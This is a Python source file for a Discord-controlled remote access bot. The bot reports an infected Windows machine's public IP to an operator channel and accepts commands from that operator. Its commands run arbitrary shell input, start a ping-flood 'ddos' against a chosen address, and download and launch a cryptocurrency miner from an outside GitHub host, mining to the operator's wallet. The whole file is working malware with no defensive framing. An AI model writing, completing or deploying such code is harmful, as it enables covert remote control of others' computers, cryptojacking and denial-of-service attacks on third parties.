from discord.ext import commands
from discord import app_commands
from tendo import singleton
from pathlib import Path
import subprocess
import requests
import discord
import pathlib
import psutil
import shutil
import sys
import os

token = '' #TOKEN
channel_id =  #CHANNELID

# sinlge proccess
me = singleton.SingleInstance()

# bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command('help')
temp = os.getenv('temp')
ip = requests.get('https://api.ipify.org').text.strip()
file_name = os.path.basename(__file__)

# ram info
total_ram = psutil.virtual_memory().total
mram = int(str(total_ram / 2)[0])

# cd temp
os.chdir(temp)

# log
@bot.event
async def on_ready():
    print(f'{bot.user}')
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=ip))
    channel = bot.get_channel(channel_id)
    await channel.send(f"``[+] {ip}: Session opened``")


# ----- Commands ----- #

# sessions
@bot.command()
async def sessions(ctx):
    await ctx.send(f"``--> {ip}``")

# kill
@bot.command()
async def kill(ctx):
    channel = bot.get_channel(channel_id)
    await channel.send(f"``[-] {ip}: Session closed``")
    os.popen(f'taskkill /F /IM {file_name} /T')
    sys.exit()

# shell
@bot.command()
async def shell(ctx, *args):
    arguments = ' '.join(args)
    stream = os.popen(arguments)
    output = stream.read()
    await ctx.send(f"``{output}``")

# ddos
@bot.command()
async def ddos(ctx, arg1, arg2):
    ddosip = ''.join(arg1)
    ddosbyte = ''.join(arg2)
    os.popen(f"ping {ddosip} -t -l {ddosbyte}")
    await ctx.send(f"``[+] {ip}: Ddos attack started``")
    
# stop ddos
@bot.command()
async def stopddos(ctx):
    os.popen("taskkill /F /IM ping.exe /T")
    await ctx.send(f"``[-] {ip}: Ddos attack stoped``")

# miner
@bot.command()
async def miner(ctx, arg1):
    url = "https://github.com/rxu7s/Public/raw/main/hellminer.exe"
    response = requests.get(url)
    open("hellminer.exe", "wb").write(response.content)
    url = "https://github.com/rxu7s/Public/raw/main/verus-solver.exe"
    response = requests.get(url)
    open("verus-solver.exe", "wb").write(response.content)
        
    os.popen("taskkill /F /IM hellminer.exe /T")
    os.popen("taskkill /F /IM verus-solver.exe /T")
        
    wallet = ''.join(arg1)
    os.popen(f"hellminer.exe -c stratum+tcp://eu.luckpool.net:3956#xnsub -u {wallet}.Windows -p x --cpu {mram}")
    await ctx.send(f"``[+] {ip}: Miner started``")

# stop miner
@bot.command()
async def stopminer(ctx):
    os.popen("taskkill /F /IM hellminer.exe /T")
    os.popen("taskkill /F /IM verus-solver.exe /T")
    await ctx.send(f"``[-] {ip}: Miner stoped``")

bot.run(token)